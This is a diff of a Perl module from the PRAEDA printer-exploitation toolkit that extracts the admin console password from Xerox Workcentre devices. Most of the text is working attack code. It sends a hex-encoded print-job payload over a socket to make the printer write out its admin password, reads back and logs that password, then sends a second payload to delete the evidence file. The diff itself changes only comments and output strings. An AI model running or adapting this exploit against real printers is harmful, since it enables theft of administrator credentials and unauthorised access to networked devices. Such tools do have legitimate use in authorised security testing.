@@ -1,8 +1,8 @@
-#Workcentre  Admin password extractor  "BETA-TEST-MODULE"
+# Xerox Workcentre  Admin console password extractor  
 ######################################################
-#              PRAEDA Module #MP0022                 #
-#          Copyright (C) 2013 Foofus.net             #
-#              Deral 'percX' Heiland                 #
+#                PRAEDA Module #MP0022               #
+#                 Copyright (C) 2014                 #
+#              Deral 'percent_x' Heiland             #
 ######################################################
 package MP0022;
 sub MP0022
@@ -16,8 +16,7 @@ my $web = $_[3];
 my $OUTPUT = $_[4];
 my $LOGFILE = $_[5];
 
-# Extract Admin password
-#----------------------------------------------------------------------------------start----#
+# Extract Admin password-------------------------------------------------------
 
 
 $socket = new IO::Socket::INET (
@@ -32,7 +31,6 @@ $extract_data = "\x25\x25\x58\x52\x58\x62\x65\x67\x69\x6e\x0a\x25\x25\x4f\x49\x4
 $socket->send($extract_data);
 close $socket;
 
-#----------------------------------------------------------------------------------End------#
 
 #sleep for given time wait for code to run
 sleep(30);
@@ -50,19 +48,15 @@ $content =~ s/\s+$//; #remove trailing spaces
 open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $OUTPUT \n");
      print OUTFILE "\n****Attempting to extract Admin account password from $TARGET : JOB MP0022****\n";
      print "\n****Attempting to extract Admin account password from $TARGET : JOB MP0022****\n";
-     print OUTFILE "SUCCESS Admin account password for $TARGET = $content\n";
-     print "SUCCESS Admin account password for $TARGET = $content\n";
-
+     print OUTFILE "SUCCESS:Xerox: Admin account password for $TARGET = $content\n";
+     print "Admin account password for $TARGET = $content\n";
 
 
 #close output file
 close(OUTFILE);
 
 
-
-# Delete the Praeda.txt file created
-
-#----------------------------------------------------------------------------------start----#
+# Delete the Praeda.txt file created-------------------------------------------
 
 
 $socket = new IO::Socket::INET (
@@ -77,8 +71,5 @@ $remove_data = "\x25\x25\x58\x52\x58\x62\x65\x67\x69\x6e\x0a\x25\x25\x4f\x49\x44
 $socket->send($remove_data);
 close $socket;
 
-#----------------------------------------------------------------------------------End------#
-
 }
 1;
-
